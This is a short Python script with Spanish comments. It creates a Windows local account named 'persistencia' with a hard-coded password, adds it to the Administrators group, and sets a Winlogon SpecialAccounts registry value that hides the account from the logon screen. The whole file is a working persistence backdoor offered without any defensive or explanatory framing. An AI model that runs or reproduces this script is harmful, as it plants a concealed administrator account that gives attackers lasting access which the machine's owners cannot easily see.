import os
import subprocess
import winreg

def crear_usuario_persistente_oculto(nombre_usuario, contrasena):
    try:
        # Crear usuario
        subprocess.run(f'net user {nombre_usuario} {contrasena} /add', shell=True, check=True)
        print(f'Usuario "{nombre_usuario}" creado correctamente.')

        # Añadir usuario al grupo administradores
        subprocess.run(f'net localgroup administrators {nombre_usuario} /add', shell=True, check=True)
        print(f'Usuario "{nombre_usuario}" añadido al grupo de administradores.')

        # Abrir la clave del registro para ocultar el usuario
        clave = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                              r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList",
                              0, winreg.KEY_SET_VALUE)
        # Crear o modificar valor DWORD con nombre del usuario a 0 (oculto)
        winreg.SetValueEx(clave, nombre_usuario, 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(clave)
        print(f'Usuario "{nombre_usuario}" ocultado en el inicio de sesión.')

    except subprocess.CalledProcessError as e:
        print(f'Error al ejecutar comando: {e}')
    except FileNotFoundError:
        print('La clave del registro no existe, creando clave...')
        try:
            # Crear la clave si no existe
            clave = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                                    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList")
            winreg.SetValueEx(clave, nombre_usuario, 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(clave)
            print(f'Clave creada y usuario "{nombre_usuario}" ocultado.')
        except Exception as ex:
            print(f'Error al crear clave de registro: {ex}')

if __name__ == "__main__":
    usuario = "persistencia"
    password = "Password123"
    crear_usuario_persistente_oculto(usuario, password)